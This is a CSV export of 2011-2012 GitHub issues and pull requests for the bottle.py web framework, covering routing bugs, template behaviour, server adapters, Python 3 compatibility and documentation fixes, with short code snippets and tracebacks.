ID,Title,Created At,Closed At,Issues,Errors,Messages,Body
313,Adding an example using WebTest and Nose,2012-04-17T17:34:45Z,2012-04-18T09:25:54Z,,,,
312,Update docs/recipes.rst,2012-04-17T17:11:10Z,2012-04-17T17:13:34Z,,,,"Unit testing example added
"
311,"HEAD forces ""Content-Length: 0"" header",2012-04-17T02:23:23Z,2012-08-29T23:44:29Z,,,,"The wsgi() function sets 'out =[]' for HEAD requests.  This causes wsgiref WSGIServer to set ""Content-Length: 0"", overriding the Content-Length set by the application.  According to RFC 2616, section 14.13 (http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.13), ""...or, in the case of the HEAD method, the size of the entity-body that would have been sent had the request been a GET.""  The following patch leaves the response body intact, which in turn allows the correct Content-Length to be returned to the HTTP client.  The version I am using is current as of about an hours ago and has a last commit of Fri Apr 6 01:08:24 2012 +0800.

```
861,862c861
<             if response._status_code in (100, 101, 204, 304)\
<             or request.method == 'HEAD':

---
>             if response._status_code in (100, 101, 204, 304):
864a864,865
>             if request.method == 'HEAD':
>                 if hasattr(out, 'close'): out.close()
```
"
310,`route` changes its behavior on some backends,2012-04-10T14:53:09Z,,,,,"Hi,
while tracking a bug I found some voodoo problem on paths prefix.
A route matching `@route(""/:objpath#.+#"")` may lose part of the path:

On ""wsgiref"" I see no bug, but if I switch to `waitress` or `paste` and I try an ""almost valid"" url like `somehost//path/subpath/subsubpath` (note the double ""/"" , which is not exactly correct)  I just receive `subpath/subsubpath` as the full path... so I miss the ""path"" information...

I didn't investigate that long, tell me if you need a minimal test-case.
"
309,Update bottle.py,2012-04-08T15:27:47Z,2012-04-10T11:55:32Z,,,,
308,"(#307) If 'gevent' and quite=True, suppress output",2012-04-05T17:13:06Z,2012-04-05T20:14:31Z,,,,"Issue #307:

When run(server='gevent', host='127.0.0.1', port=9999, quiet=True), bottle still log the request.

like
127.0.0.1 - - [2012-04-06 00:58:02] ""POST / HTTP/1.1"" 201 149 0.000999
"
307,"When use 'gevent' and quite=True, the output should be suppressed",2012-04-05T17:04:12Z,2016-02-08T04:27:42Z,,,,"When `run(server='gevent', host='127.0.0.1', port=9999, quiet=True)`, bottle still log the request.

like
`127.0.0.1 - - [2012-04-06 00:58:02] ""POST / HTTP/1.1"" 201 149 0.000999`
"
306,template export it's namespace to subtemplate,2012-04-02T07:09:31Z,,,,,"sometimes It's convenient for export current namespace when rebase or include.

explicit set the option `bottle.SimpleTemplate.settings['export_env']` to `True` to enable this behavior.

subtemplate can overide the parent's namespace if they both defined same argument.

current this option is global for whole rendering process. The behavior can't change in subtemplate rendering.
"
305,Fixed typos,2012-03-29T19:27:53Z,2012-04-02T15:46:40Z,,,,"Hi.
I fixed some typos across the docs.
Changes are self-explanatory.
"
304,strange bug in version 0.10.dev,2012-03-28T10:22:59Z,,,AttributeError,AttributeError: 'NoneType' object has no attribute 'groupdict',"I can't reproduce it reliably. It happens once in a while, no matter how is the application deployed (paster, built in server etc). When it happens, this exception occurs on every http request (regardless of the url) and requires a restart.

```
127.0.0.1 - - [20/Jan/2012:09:39:55 +0100] ""GET /dev/getcurrentrev HTTP/1.1"" 500 756 ""http://10.13.0.90/dev"" ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1""
Traceback (most recent call last):
  File ""/GameStream/scripts/bottle.py"", line 687, in _handle
    route, args = self.match(environ)
  File ""/GameStream/scripts/bottle.py"", line 591, in match
    route, args = self.router.match(environ)
  File ""/GameStream/scripts/bottle.py"", line 324, in match
    targets, urlargs = self._match_path(environ)
  File ""/GameStream/scripts/bottle.py"", line 350, in _match_path
   return match, gpat(path).groupdict() if gpat else {}
AttributeError: 'NoneType' object has no attribute 'groupdict'
```
"
303,Improve docs: clarify route ordering topic,2012-03-27T13:17:29Z,,,,,"When [1] appeared in maillist, I read [2] and have doubts about how bottle works, even knowing how it works. The routing order topic give only one example of how bottle do not work, none about how it really works.

I guess we can add some examples about it. Second paragraph already talk about that issue, but examples can improve the docs.

[1] https://groups.google.com/d/topic/bottlepy/9-LkJX6K6xQ/discussion
[2] http://readthedocs.org/docs/bottle/en/latest/routing.html#routing-order
"
302,Enhanced example using @error(404),2012-03-24T21:05:33Z,2012-03-25T18:41:30Z,,,,"Hello!
I added the import line in the `@error(404)` tutorial example.
This way the tutorial it's more complete.

Although I don't know how you're managing the http://bottlepy.org website, if it gets it's contents automatically from these files or not so they stay in sync. 
"
301,Rails like url_for helper,2012-03-15T22:38:37Z,2012-03-16T20:28:50Z,,,,"How about rails like url_for helper?
"
300,Waitress compatibility could be featured,2012-03-13T13:47:51Z,2012-03-13T15:47:54Z,,,,"The waitress WSGI web server ( http://docs.pylonsproject.org/projects/waitress/en/latest/ ) could be included, it's compatible with any python version starting from 2.6... I suppose this is likely to work:

``` python
class WaitressServer(ServerAdapter):
    def run(self, handler):
        from waitress import serve
        serve(handler, host=self.host, port=self.port)
```
"
299,Bottle should have per request local storage,2012-03-09T12:07:51Z,,,,,"Hi,

After some discussion on IRC and Stackoverflow\* regarding reuse of request objects (bottle.request) and thread local (bottle.local) there were identified a need for some sort of per request local storage.

Use case:

In my code I validate login tokens (cookies with session ID or similar) in a generic routing at the beginning of each request before control is handed back to the defined route handling procedure. The token validation is implemented as a decorator called @restricted.

In order to separate the generic code and the route handling I have added an attribute to the request object that holds any user information after token validation so I can use this in the route handling procedures later. To remove redundant database lookups I have also added code to check whether this attribute exists in the request object already.

Problem:

Since request objects are reused, validation will only happen once. Depending on the web server, this might even introduce a security vulnerability.

Using bottle.local would fix the problem for my specific implementation, but any multiplexed IO based server (non-blocking server) might treat the bottle.local storage as ""global"".

Suggested solution:

Adding some sort of request-local storage area that is guaranteed to only be accessible from the current request, no matter web server implementation.

ref: http://stackoverflow.com/questions/9627001/bottle-py-request-object-reuse-object-life-cycle
"
298,access to response.COOKIES  throws exception,2012-03-08T14:20:06Z,2012-03-08T16:14:39Z,,,,"try the following simple code:

> > > import bottle
> > > bottle.response.COOKIES
> > > Traceback (most recent call last):
> > >   File ""<stdin>"", line 1, in <module>
> > >   File ""/usr/local/lib/python2.7/site-packages/bottle.py"", line 1376, in COOKIES
> > >     if not self._cookies:
> > >   File ""/usr/local/lib/python2.7/site-packages/bottle.py"", line 1456, in <lambda>
> > >     lambda self: getattr(_lctx, name),
> > > AttributeError: 'thread._local' object has no attribute 'response_cookies'

looks like the response object was not initialized properly.
"
297,"Error 500 if special non-ascii characters (i.e. ""ä"") are in the path to grademan",2012-03-07T19:16:15Z,2012-03-26T18:15:46Z,,"Exception, UnicodeEncodeError","Exception:, UnicodeEncodeError: 'ascii' codec can't encode character u'\xe4' in position 951: ordinal not in range(128)","Example output:

[..]
Exception:
UnicodeDecodeError(\'ascii\', \'/home/dirk/MeeGo/Daten/Gr\xc3\xa4deMan\', 25, 26, \'ordinal not in range(128)\')
Traceback:
[..]
Traceback (most recent call last):
  File ""/home/dirk/MeeGo/Daten/GrädeMan/bottle.py"", line 663, in wsgi
    out = self._cast(out, request, response)
  File ""/home/dirk/MeeGo/Daten/GrädeMan/bottle.py"", line 618, in _cast
    return self._cast(self.error_handler.get(out.status, repr)(out), request, response)
UnicodeEncodeError: 'ascii' codec can't encode character u'\xe4' in position 951: ordinal not in range(128)
"
296,File never submitted if changedate of file not changed but file actually is changed,2012-03-07T18:43:13Z,2012-03-08T16:23:59Z,,,,"If I rename foo.jpg to bar.jpg and bar.jpg to foo.jpg the changed files are not send again, even after I restart bottle.

Uncommenting the lines
<code>
    if ims:
        ims = ims.split("";"")[0].strip() # IE sends ""<date>; length=146""
        ims = parse_date(ims)
        if ims is not None and ims >= int(stats.st_mtime):
            header['Date'] = time.strftime(""%a, %d %b %Y %H:%M:%S GMT"", time.gmtime())
            return HTTPResponse(status=304, header=header)
</code>
in static_file fixes this.
"
295,Multiple plugins can't inject parameters,2012-03-06T22:20:18Z,,,,,"Hi,

I am trying to write a plugin which injects some data into the the functions, but it failes if I already have another plugin (say sqlite).

A simple example is the code below:

``` python
from bottle import *
import bottle
from bottle.ext import sqlite

app = bottle.Bottle()
test_db = sqlite.Plugin(dbfile='test.db')
cache_db = sqlite.Plugin(dbfile=':memory:', keyword='cache')
app.install(test_db)
app.install(cache_db)

@app.route('/')
def show(db, cache):
    return ""successfully loaded both plugins""

if __name__ == ""__main__"":
    run(app, reloader=True)
```

when run, it throws this error : `TypeError: show() takes exactly 2 arguments (0 given)`
"
294,SimpleTemplate and long i18n strings,2012-03-06T21:12:17Z,2012-03-06T21:18:56Z,,,,"If I have the following in a template:

```
{{_('This is a really long string that '
    'I want to split across multiple lines in the source')}}
```

What I get in the output is the exact same thing, including the {{ and }}.  I may be missing the ""proper"" way to make {{ and }} span multiple lines.  However, if I use the mako_view and do about the same thing:

```
${_('This is a really long string that '
    'I want to split across multiple lines in the source')}
```

It works fine.
"
293,redirect() uses server root instead of application root,2012-03-02T13:32:10Z,,,,,"I've run into an issue when using bottle in a subdirectory of the server root.

Steps to reproduce:
1. Build a simple app in a subdirectory of the server root (CGI works good for that).
2. Put `redirect(""/"")` into a route.
3. Call the route. You'll be redirected to the server root instead of the application root.

This issue makes it difficult to build apps that are deployed in different paths. The cause of the problem is that `redirect()` uses `urljoin()` on the request URL. If the target contains a leading slash, everything after the host part of the URL gets replaced. This could also lead to problems when using `mount()`, though I haven't tested it yet.

Workarounds:
- Build your own redirect function that prepends the application root directory
- Add `request.script_name` to every redirect (ugly)
- modify `redirect()` so that it always includes `request.script_name` (hackish)

The problem with `request.script_name` is that in some cases it includes the name of the .py file which would lead to ugly URLs, especially when using CGI on Apache with mod_rewrite. A more sustainable solution would be the introduction of a application root variable (which can be ""/"" by default). The root path could be set in `run()` or in a special function. When it is set, all redirects are based on that path.

One could also add the path to SimpleTemplate.defaults to include it in template URLs, but a more beautiful solution for that would be a special markup for URLs (maybe `{# #}` or similar).
"
292,Upload Example in Tutorial Doesn't work,2012-03-01T21:42:57Z,,,,,"The [example in the tutorial for uploads](http://bottlepy.org/docs/dev/tutorial.html#post-form-data-and-file-uploads) doesn't work with the current version of bottle.

Here is a modified example that does work:

``` python
from bottle import route, request
@route('/upload', method='POST')
def do_upload():
    data = request.files['data']
    name = data.name
    if name and data.file:
        raw = data.file.read() # This is dangerous for big files
        filename = data.filename
        return ""Hello %s! You uploaded %s (%d bytes)."" % (name, filename, len(raw))
    return ""You missed a field.""
```
"
291,consider adding info on nginx config,2012-02-29T15:17:27Z,,,,,"The bottle docs mention Apache WSGI setup, they should probably also mention nginx. 
The docs also mention Pound, but AFAICT nginx has now made Pound obsolete.
"
290,Wrong REMOTE_ADDR reported when running with server='fapws3',2012-02-29T11:03:08Z,,,,,"It's a bug of fapws3, not bottle. Reported it at https://github.com/william-os4y/fapws3/issues/34 and resolved.

I'm using python-bottle 0.10.7-1 on Debian, with fapws3 0.10.dev.

I find this problem on a heavily loaded web server. Then I start to test it on my local machine.

With the simple show ip application:

@route('/')
def show_ip():
    ip = request.environ.get('REMOTE_ADDR')
    # or ip = request.get('REMOTE_ADDR')
    # or ip = request['REMOTE_ADDR']
    return ""%s\n"" % ip

run(host='0.0.0.0', port=8080, server='fapws3')

by typing commands quickly (Ctrl-y, Enter, Ctrl-y, Enter, ... ), sometimes I can get:

~$ curl 10.20.1.50:8080 & curl localhost:8080
[1] 14631
10.20.1.50
127.0.0.1
[1]+ DONE curl 10.20.1.50:8080
~$ curl 10.20.1.50:8080 & curl localhost:8080
[1] 14633
127.0.0.1
127.0.0.1

and 

~$ curl 10.20.1.50:8080 & curl localhost:8080
[1] 14403
10.20.1.50
10.20.1.50

I'm not sure where the problem comes, from bottle, or fapws3 or their interaction.
"
289,Allow for zero-copy file uploads.,2012-02-20T02:31:03Z,,,,,"see issue 288 (https://github.com/defnull/bottle/issues/288)
"
288,Allow for zero-copy file uploads.,2012-02-19T23:45:46Z,,,,,"Right now, Bottle directly calls cgi.FieldStorage to parse incoming data.

cgi.FieldStorage has a 'make_file' method defined with the following comment:

```
def make_file(self, binary=None):
    """"""Overridable: return a readable & writable file.

    The file will be used as follows:
    - data is written to it
    - seek(0)
    - data is read from it

    The 'binary' argument is unused -- the file is always opened
    in binary mode.

    This version opens a temporary file for reading and writing,
    and immediately deletes (unlinks) it.  The trick (on Unix!) is
    that the file can still be used, but it can't be opened by
    another process, and it will automatically be deleted when it
    is closed or when the current process terminates.

    If you want a more permanent file, you derive a class which
    overrides this method.  If you want a visible temporary file
    that is nevertheless automatically deleted when the script
    terminates, try defining a __del__ method in a derived class
    which unlinks the temporary files you have created.

    """"""
```

It would be nice if Bottle allowed more easy access to providing your own FieldStorage class implementation, or perhaps specifically allowed for optionally providing a make_file implementation.

My use case is that I would like to have Bottle upload file data directly to its final storage location, instead of being uploaded to a tempfile and then being copied again to its final destination.
"
287,request for pluggable json encode/decode functions to process response,2012-02-16T05:41:00Z,,Needs Documentation,,,"Hi there,

Luv bottle so far. Ran into an expected issue when dealing with json encoding that I have fixed for myself temporarily in my local copy.  

Couple of issues so far:
1/. It is perfectly alright to json encode a list (or a tuple) for that matter - in the pragmatic world of building Ajaxy web apps. The latest dev version (that I am using) checks if the response is a dict and if so applies json encoding on it. I patched mine to apply json encoding if it is a dict or a list. Not 100% sure about tuples so I left it at that.

2/. The response consists of data retrieved from a database and as expected json encoding tripped when it saw datetime and date types. There is a known way to override json package's dumps and loads methods. I took patch (that I had to write when using Py-rs) and just inserted again into my copy of bottle.

Overall, worked around the issue and I am in good shape to continue to use bottle. What nags me is that I had plans of extending my json patch to support direct encoding of database results from the database layer API such as straight dbapi, sqlalchemy - something along the lines of what I found at http://www.mail-archive.com/turbogears-commits@googlegroups.com/msg03926.html - which means I will have to keep patching bottle as new versions get released.

Ideal would be if I could pass json encode and decode functions when Bottle() instantiated - something along the lines of:

<code>
 myapi = Bottle(json_encode = myencoder, json_decode=mydecoder);
</code>

Or some thing along those lines or better. You get the idea.

Making an automatic decision to encode to json based on response type is a pretty significant and important design decision.  And I think should come with an option to allow the user to configure what gets encoded and how.

Thanks,
"
286,Encoding definition improved in SimpleTemplate,2012-02-16T02:42:16Z,2012-02-17T14:00:27Z,,,,"SimpleTemplate crashed when I did it:

```
% a=1
% coding=a
```

This code is useless and probably nobody else will found this bug, I used the word ""coding"" by accident.

After that, I found the regex to parse this encoding and created some tests to break it in other improbable ways.
"
285,SimpleTemplate {% blocks %} proposal,2012-02-15T16:03:26Z,,,,,"Today I was thinking about JavaScript compression and how other frameworks handle it. Flask has Assets [1], Django has a lot of compressor plugins [2] [3]. All of them (which I looked) use template blocks, because they are based on django templates or Jinja2.

I know I can do something similar using Python functions to create blocks, but it is not a reusable way to do it. I can do something like `{{ my_filter('some html') }}`, but I can't do it in a pretty way with a multiline html for example.

I'm not proposing a specific syntax yet, first I want to know if other people want this too. It is a big limitation to me and I don't want to use other template engine, I like SimpleTemplate.

I found an old issue about something similar [4], but I already explained why it doesn't solve the problem. I need to define a function and call it just to render some simple HTML, I don't like it.

[1] http://flask-assets.readthedocs.org/en/latest/index.html
[2] http://djangopackages.com/grids/g/asset-managers/
[3] https://github.com/jezdez/django_compressor
[4] https://github.com/defnull/bottle/issues/20
"
284,"Fix: PATH_INFO always contains ""/"" for mounted app root",2012-02-14T20:40:58Z,,,,,"When application is mounted to `/some_path` then `PATH_INFO` contains `/` for
requests to both `/some_path` and `/some_path/`. So it is probably impossible
to distinguish between these urls in mounted application (e.g. to redirect to
normalized url).

According to wsgi spec `PATH_INFO` **may** be empty in this case. It's seems
to be possible to get desired behaviour by changing `path_shift()`.
"
283,fix a typo in docs/recipes.rst,2012-02-14T19:02:14Z,2012-03-26T18:28:53Z,,,,
282,new rule filter: paging,2012-02-14T03:14:39Z,2012-02-16T05:39:33Z,,,,"Hi:
  The paging is frequent in website.For example,in my website:

```
  @r('/all')
  @r('/all/<page:int>')
  def products(page=1):
      if page==0: page=1
      ... ....
```

  So I write a rule for myself:

```
  #in __init__()
  self.filters['page'] = self.page_filter

    def page_filter(self, conf):
        '''pading'''
        return r'\d+', int, lambda x: int(x) if x>0 else 1
```

  I think it's valuable if merge into master branch.
"
281,Bottle.mount raises DeprecationWarning BaseReuqest.status will change to return a string in 0.11,2012-02-10T17:25:20Z,2012-02-10T19:44:03Z,,,,"Hello,

Bottle.mount raises DeprecationWarning BaseReuqest.status will change to return a string in 0.11 :

bottle-0.10.7-py2.6.egg/bottle.py:583: DeprecationWarning: BaseReuqest.status will change to return a string in 0.11. Use status_line and status_code to make sure.
  return HTTPResponse(rs.body, rs.status, rs.headers)

I guess it should be rs.status_code instead of rs.status_line.

I hope it helped !
Cheers,
CH
"
280,strongly recommend bottle to support unicode native,2012-02-09T07:17:43Z,,,,,"strongly recommend bottle to support unicode native.

django and flask both support unicode native, it's import for  unicode users, thanks!
"
279,WTForms not support bottle's file fields.,2012-02-07T16:05:55Z,,,,,"Because I need to use unicode, so the code is like this:

form = EntryAddForm(obj=request.forms)

Then I find WTForms not support bottle's file fields.
"
278,Possible lockfile undefined,2012-02-02T00:08:14Z,2012-02-02T13:00:17Z,,,,"I never get this error, but I received a thumbs down in StackOverflow possible because of it.

http://stackoverflow.com/questions/8608743/whats-the-best-way-to-disable-jinja2-template-caching-in-bottle-py/8629800#comment11410724_8629800

If something wrong happens with lockfile creation in line 2440 (https://github.com/defnull/bottle/blob/master/bottle.py#L2440), in finally clause the `lockfile` variable don't exists, like it is commented in stackoverflow.

My theory is he is using some server adapter which don't support `reloader=True`.
"
277,parse json less strictly,2012-02-01T01:26:05Z,,,simplejson.decoder.JSONDecodeError,simplejson.decoder.JSONDecodeError: Invalid control character at: line 1 ,"A standard and strict json format is 
{""title"": ""\u6587\u7ae0\u6807\u9898\n\u6362\u884c""}

Sometimes, especially in a cross-language platform, the json would be
{""title"": ""Title
new line""}
Using simplejson.loads(json) might cause the exception to occur:

Traceback (most recent call last):
  File ""testjson.py"", line 24, in <module>
    print simplejson.loads(json)
  File ""/System/Library/Frameworks/Python.framework/Versions/2.5/lib/python2.5/
site-packages/PIL/**init**.py"", line 384, in loads

  File ""build/bdist.macosx-10.5-i386/egg/simplejson/decoder.py"", line 402, 
in decode
  File ""build/bdist.macosx-10.5-i386/egg/simplejson/decoder.py"", line 418, 
in raw_decode
simplejson.decoder.JSONDecodeError: Invalid control character at: line 1 
column 15 (char 15)

simplejson.loads() has a parameter that is not mentioned in the documentation, “strict”. With this parameter we can parse json string less strictly.

Therefore, is it possible for bottle to change its json parsing as some form like
simplejson.loads(json, strict=False)
and instead of ""request.json['data']"",  is there a more elegant way?
"
276,AttributeError: 'LocalRequest' object has no attribute 'header',2012-01-31T18:58:24Z,2012-02-17T14:32:45Z,,AttributeError,AttributeError: 'LocalRequest' object has no attribute 'header',"( I posted this to the bottlepy Google Group last week, but it's still waiting for a moderator to OK it).

I have been running successfully with bottle 0.9.6. I recently
upgraded to 0.10.7, and now my application is failing with:

Traceback (most recent call last):
  File ""/dls_sw/apps/DataDispenser/python/ws043/lib/python2.7/site-
packages/bottle.py"", line 737, in _handle
    return route.call(*_args)
  File ""/dls_sw/apps/DataDispenser/python/ws043/lib/python2.7/site-
packages/bottle.py"", line 1456, in wrapper
    rv = callback(_a, **ka)
  File ""/dls_sw/apps/DataDispenser/dev/webinterface.py"", line 267, in
login
    destination_url = bottle.request.header.get('Referer',
'/').strip()
AttributeError: 'LocalRequest' object has no attribute 'header'

The changelog indicates that there have been some changes in this area
in 0.10, but looking at the docs, I think bottle.request.header should
still exist.

Is there a change I need to make to my code?

Thanks
"
275,reloader: RuntimeError in thread due to 'dict. size change' (+ workaround),2012-01-29T21:11:47Z,2012-02-01T09:38:48Z,,,,"(Disclaimer: (1)Just starting out with Bottle framework, in attempt to create simple, web-based access to local database, and (2) no professional Python coder.)

Issue: When I enable the auto-reloader with the ""run(reloader=True)"" command on my Ubuntu box (2.6.32-38, 64bit):  

with Python 2.6: all works as expected
with Python 3.2.2: a RuntimeError appears, and the auto-reloader obviously does not start. Here's the error:

> Exception in thread Thread-1:
> Traceback (most recent call last):
>   File ""/home/me/programs/Python-3.2.2/lib/python3.2/threading.py"", line 740, in _bootstrap_inner
>     self.run()
>   File ""/home/me/python/bottle_webFramework/myScripts/bottle.py"", line 2507, in run
>    for module in sys.modules.values():
> RuntimeError: dictionary changed size during iteration

Error can be solved (and functional reloader obtained, as expected), by explicitly declaring as a list in lines 2507 and 2517, but this is probably a dirty workaround only (I'm not familiar with system level thread checks...):

@ 2507
--- for module in sys.modules.values():
+++ for module in list(sys.modules.values()):

@ 2517
--- for path, lmtime in files.items():
+++ for path, lmtime in list(files.items()):

Hope this helps,
thanks for a nice, simple webframework!
"
274,Fixed: Unwanted exception,2012-01-25T06:54:50Z,2012-01-26T13:02:12Z,,,,"I found and hopefully fixed a problem with the reloader. See commit message for details.
"
273,Redirecting from another file,2012-01-13T23:43:25Z,,,,,"user.py

user_app = bottle.Bottle()
@user_app.route('/login')
def login(): redirect(""/index"")

app.py

from user import user_app
root_app = bottle.Bottle()
@root_app.route('/index')
def index(): return ""Bottle is awesome""

root_app.mount('/user', user_app)

I would like to redirect from one file to another, is this possible?
"
272,Print version number when running server,2012-01-11T22:06:18Z,2012-01-12T13:15:52Z,,,,
271,Allow to use 'quiet' arg to disable eventletserver output,2012-01-10T12:31:01Z,2012-01-12T15:33:36Z,,,,"pass `quiet = True` to `bottle.run` to disable annoying eventlet access log. 
"
270,bottle-sqlite doesn't autocommit if you redirect() out of a handler,2012-01-01T22:33:55Z,2012-02-07T18:12:28Z,,,,"https://gist.github.com/1548514 shows the problem. This code contains a tiny Bottle app with `bottle-sqlite` plugin. If you run it, access `/` with your browser, then dump the database, it'll be empty. If you change redirect at the end of the handler to something like `return ""OK""`, the data gets across to database safely.
"
269,load and load_app fail if an app already loaded them,2011-12-28T02:08:17Z,2012-02-07T20:42:19Z,,,,"Using stable, 0.10.  If I have the following files:

v1.py

```
import bottle

@bottle.get('/')
def index():
    return 'Index V1'

@bottle.put('/')
def modify(data):
    return 'Ok'
```

v2.py

```
import bottle
import v1

@bottle.get('/')
def index():
    return 'Index V2 %s' % v1.index()
```

main.py

```
import bottle

v2 = bottle.load_app('v2')
v1 = bottle.load_app('v1')
bottle.mount('/v1', v1)
bottle.mount('/v2', v2)
print 'V1 routes: %s' % len(v1.routes)
print 'V2 routes: %s' % len(v2.routes)

bottle.run(host='localhost', port=8080)
```

It outputs:

```
V1 routes: 0
V2 routes: 3
```

If I swap the ordering of loading v1 and v2, it outputs:

```
V1 routes: 2
V2 routes: 1
```

Also appears if you just call load_app twice on the same module, only the first one works, the rest come up empty.
"
268,bottle==0.10.4 missing def _e(): return sys.exc_info()[1],2011-12-22T13:01:21Z,2011-12-22T15:16:48Z,,,,"Example: http://stackoverflow.com/q/8602563/
"
267,Possible JavaScript injection in line 837,2011-12-16T16:44:58Z,2011-12-17T13:59:43Z,,,,"It was reported in Twitter: https://twitter.com/#!/bw0x00/status/147704870848311297
Line 837: https://github.com/defnull/bottle/blob/master/bottle.py#L837

I tried to create some example to exploit this bug, but I didn't know how to do it.

I guess this error page should be rendered with SimpleTemplate, even if it is really simple to construct the page without it. It doesn't affect performance.
"
266,Cannot install from source,2011-12-16T12:28:06Z,2011-12-16T13:41:43Z,,,,"Hello. I cannot properly install bottle-0.10 from source.

Here's what I've got when I'm trying to import bottle:

```
Traceback (most recent call last):
    File ""<stdin>"", line 1, in <module>
    File ""bottle.py"", line 373
          except re.error, e:
                         ^
```

I'm using Ubuntu 10.04 with python-3.1.2-dev. Also I have installed pymongo3 and pystache.
Thank you.
"
265,100% PEP8 Compliant bottle.py,2011-12-12T20:11:47Z,2013-12-04T12:13:47Z,,,,"Fixed: 400 PEP8 errors, 25 Static Errors.
"
264,Tests to path_filter,2011-12-10T14:33:40Z,2011-12-11T22:58:20Z,,,,"It wasn't tested.
"
263,Fix text in the documentation (copyedit).,2011-12-10T00:47:37Z,2011-12-11T23:01:10Z,,,,
262,Fix text in the documentation (copyedit).,2011-12-10T00:47:11Z,2011-12-11T23:03:11Z,,,,
261,float_filter bug,2011-12-09T17:33:51Z,2011-12-09T20:58:40Z,,,,"This bug was reported by janus in Google Groups: https://groups.google.com/d/topic/bottlepy/WEut1fLk-n4/discussion

I added some tests to float_filter.
"
260,PEP8 edit: Added a blank line after imports,2011-12-07T18:59:10Z,2011-12-08T16:35:24Z,,,,
259,static_file() not working with FAPWS3,2011-12-03T15:00:52Z,2012-02-07T20:43:16Z,,,,"```
from bottle import route, run, static_file, FapwsServer

@route('/static/<filename:path>')
def serve_static(filename):
    return static_file(filename, root='./static')

run(server=FapwsServer, port=8080)
```

I'm getting a 500 error every time I try to access an existing file at http://127.0.0.1:8080/static/style.css, with no error in the terminal; but using the default adapter works. (Python 2.7)
"
258,no2to3 added some bugs...,2011-12-03T12:58:59Z,2011-12-03T14:41:18Z,,,,"Just solving some pretty obvious issues.
- A `_strerr` without underscore.
- Mako and jinja2 tests without an import.
- Removing some useless imports added during no2to3 branch.
"
257,add tox.ini in order to easily test with multiple python versions,2011-12-02T21:49:47Z,2011-12-03T14:42:37Z,,,,"tox allows running tests for multiple python versions with a different
set of installed packages. To try it, run:

tox -e py25,py27-most

The default is to test with python 2.5, 2.6, 2.7, 3.2. These must be
installed on the machine.

tox can be found here: http://pypi.python.org/pypi/tox
"
256,Auto cast a unicode response status to a string if a unicode status is provided,2011-11-29T23:19:39Z,2011-12-01T13:37:12Z,,,,"This bit me, and I felt like it would be smarter to allow unicode response status inputs that get auto cast. Thoughts?
"
255,Mako defaults are not XSS safe,2011-11-28T13:26:31Z,,,,,"Mako is configured to not escape HTML control characters by default. There should be a safe default.
"
254,No2to3,2011-11-25T19:18:12Z,2011-12-02T20:39:23Z,,,,"Tests passing on 3.x
"
253,"Namespace Functions defined, get, setdefault throws ""NameError(""name 'defined' is not defined"",)""",2011-11-24T10:20:09Z,2011-11-24T19:37:53Z,,,,"in http://bottlepy.org/docs/dev/stpl.html it's said ""SimpleTemplate helps you out here: The following three functions are defined in the default namespace and accessible from anywhere within a template:""
but they all throw exceptions when used. or am i missing something
thanks
"
252,Fix heading grammar in docs,2011-11-22T15:54:52Z,2011-11-22T18:31:58Z,,,,
251,start_response result broken and never called,2011-11-13T17:43:07Z,2011-11-15T15:27:37Z,,,,"I'm testing pyflakes and it blame https://github.com/defnull/bottle/blob/master/bottle.py#L554 . It returns an anonymous function using a non-existent `out` variable. If it is called, of course some test should break.

Reading about WSGI protocol, start_response can return a callable to legacy apps,  but I guess something is wrong here.

I removed this line and all tests pass.
"
250,WTForms support,2011-11-13T08:19:27Z,2011-11-15T15:27:37Z,,,,"I find that bottle 0.10dev don't support wtforms, but 0.9 version has been support, can you fix it?
"
249,no doc on how to properly use .mount(),2011-11-10T09:48:31Z,,,,,"basically i would like to have a file handle all ""user/_"" urls and another handle ""blog/_"" urls. how can it be done with mount assuming i already have a ""hello word"" root app running
Thanks
"
248,validate() decorator cannot work with sqlite.plugin,2011-11-07T09:36:27Z,2011-11-10T09:38:21Z,,,,"the @validate decorator will not work if used together with sqlite plugin since it requires the use of non-keyword argument
using the web todo list tutorial from official website as example 

...
@route('/edit/:no', method='GET', apply=sqlite.Plugin(dbfile='todo.db'))
@validate(no=int)
def edit_item(db, no):
...

calling the url @ /edit/2 will return http error 500
TypeError('edit_item() takes exactly 2 non-keyword arguments (0 given)',)
"
247,set_cookie's doc incorrectly says path defaults to /,2011-10-31T12:17:57Z,2011-11-15T15:27:38Z,,,,"The doc says that the default value of path in set_cookie is '/', but that's not what RFC 2109 says:

<pre>   Path   Defaults to the path of the request URL that generated the
          Set-Cookie response, up to, but not including, the
          right-most /.
</pre>
"
